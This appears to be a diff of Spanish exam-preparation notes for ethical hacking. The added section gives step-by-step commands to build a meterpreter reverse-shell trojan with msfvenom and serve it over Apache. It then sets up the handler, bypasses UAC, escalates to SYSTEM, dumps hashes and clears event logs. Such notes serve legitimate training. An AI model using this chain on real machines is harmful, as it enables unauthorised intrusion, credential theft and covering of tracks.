@@ -114,8 +114,8 @@
   
 6. Hacking
 ----------
-  Capturar Hashes con Responder
-  -----------------------------
+  1. Capturar Hashes con Responder
+  --------------------------------
   responder -I [interfaz_red] (Mirar las interfaces de red antes ifconfig|ip address)
   
   Desde la máquina de Windows 10 hacemos lo siguiente:
@@ -132,23 +132,71 @@
   
   En el examen ponemos el responder para ver si capturamos algún hash, dado que es posible que las máquinas estén haciendo peticiones.
   
-  Atacando desde Windows 10
-  -------------------------
+  2. Atacando desde Windows 10
+  ----------------------------
     Para crackear passwords (Practicar con ambas herramientas de cara al examen)
     -----------------------
     - L0phtCrack
     - RainbowCrack
     
-  Esteganografía
-  --------------
+  3. Esteganografía
+  -----------------
   Este proceso se hará desde la máquina Windows 10 que nos den en el examen y tendremos las siguientes herramientas:
    - OpenStego (Imágenes).
    - SNOW (Espacios en blanco).
   
   En este desafío nos darán una imagen y nos dirán que hay algo oculto, en un desafío previo habremos conseguido la contraseña.
   
-  Crear un troyano con metasploit
-  -------------------------------
-  msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP] LPORT=[port] 
+  4. Crear un troyano con metasploit y utilizarlo sobre una máquina windows
+  -------------------------------------------------------------------------
+  msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP] LPORT=[port] -o pruebas.exe
+  
+  Ahora lo movemos al directorio /var/www/html para poder ponerlo en el servidor web con Apache.
+  - cp pruebas.exe /var/www/html
+  
+  Arrancamos el servicio apache2
+  - systemctl start apache2
+  
+  Comprobamos que se ha arrancado correctamente el servicio
+  - systemctl status apache2
+  
+  Una vez tenemos el servidor en marcha, procedemos a descargar el troyano en la máquina víctima.
+  
+  También deberemos poner la escucha en la consola de metasploit con los siguientes comandos:
+  msfconsole
+  msf6> use multi/handler
+  msf6> set payload windows/meterpreter/reverse_tcp
+  msf6> set lhost [IP]
+  msf6> set lport [PORT]
+  msf6> run -j
+  
+  A continuación, ejecutamos el troyano en la víctima y nos vamos a la consola de metasploit donde veremos que se ha creado la sesión.
+  
+  Usamos el exploit windows/local/bypassuac_fodhelper para saltarnos la uac del sistema le configuramos lo siguiente:
+  - El payload windows/meterpreter/reverse_tcp.
+  - La sesión de meterpreter.
+  
+  Lo lanzamos con exploit y nos creará una nueva sesión.
+  
+  Una vez tenemos la sesión, entramos en ella y elevamos nuestros privilegios con el comando: getsystem -t 1.
+  
+  Ahora somos el usuario NT AUTHORITY\SYSTEM que es el usuario con más privilegios en windows.
+  
+  Podríamos lanzar un hashdump y posteriormente limpiamos los logs clearev.
+  
+    Extra
+    -----
+    Utilizamos el repositorio PowerSploit, en concreto el script PowerUp.ps1 de Privesc
+    1. Lo subimos desde la sesión de meterpreter con upload.
+    2. Abrímos una shell.
+    3. Ejecutamos el script con el comando: powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
+  
+  The Fat Rat
+  -----------
+  Es una herramienta para crear troyanos en macros para office.
+  
+  A continuación, se indica el proceso de configuración (en el examen ya estará configurado si se usa):
+  - Lanzamos dos veces el script setup.sh.
+   
   
   
